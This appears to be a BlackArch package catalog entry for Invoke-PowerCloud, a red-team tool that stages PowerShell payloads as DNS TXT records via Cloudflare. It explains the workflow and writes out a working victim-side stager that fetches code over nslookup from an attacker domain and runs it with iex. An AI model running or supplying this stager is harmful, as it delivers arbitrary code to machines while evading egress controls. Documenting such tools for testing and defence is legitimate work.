---
name: "powercloud"
categories:
  - blackarch-windows
version: "21.0928303"
homepage: "https://github.com/mantvydasb/Invoke-PowerCloud"
packaged-by: [blackarch]
blackarch-builddate: "2019-05-31"
build-system: windows
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "mantvydasb/Invoke-PowerCloud"
github-stars: 63
github-pushed: "2019-02-06"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.3
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# powercloud

> Invoke-PowerCloud — stage a PowerShell payload as DNS TXT records via the Cloudflare API and get back a one-liner stager that reassembles it with nslookup.

## What it's for

Invoke-PowerCloud (Mantvydas Baranauskas, based on PowerDNS by Dominic Chell) solves payload delivery on networks where HTTP egress is blocked but DNS still resolves: it takes a local payload file, base64-encodes it, splits it into TXT-record-sized chunks, uploads those chunks as DNS TXT records for a domain you control (via the Cloudflare API), and prints a compact stager one-liner that reassembles the payload on the victim with nothing but `nslookup` and `iex` — no PowerShell download cradles, no direct TCP. It is a delivery/egress tool rather than an implant: the payload itself can be any script; powercloud only handles the DNS-based transport and stager generation. Two practical constraints shape its use: it wipes the zone's existing TXT records before uploading (it assumes a dedicated staging domain), and Cloudflare credentials must be edited into the script's `$Global:API_KEY`/`$Global:EMAIL` variables before running.

## Typical use cases

### Stage a payload as DNS TXT records

The one-shot upload, run from an operator machine with the target script local.

```
Invoke-PowerCloud -FilePath .\payload.ps1 -domain ops.example.com
```

Outcome: with the Cloudflare API key and email set inside Invoke-PowerCloud.ps1, it queries the account's zones, picks the zone for ops.example.com, removes all existing TXT records in it, base64-chunks `payload.ps1`, uploads the chunks as numbered TXT records via a BIND-style zone file push, and prints two stager one-liners (one also copied to the clipboard). The records stay in place until the next run removes them.

### Run the generated stager on the target

What the victim side looks like after staging.

```
$b64=""; (1..12) | ForEach-Object { $b64+=(nslookup -q=txt "$_.ops.example.com")[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace('\t|"',""))))
```

Outcome: loops over the TXT record numbers (the real count is printed by the staging run), concatenates the last line of each `nslookup` TXT answer, strips quoting, base64-decodes and executes the payload — entirely over DNS, using the system resolver. The second printed variant pins the zone's authoritative name server (also printed by the staging run) instead of relying on the local resolver's caching.

*No corpus evidence — derived from upstream documentation and the packaged script source.*
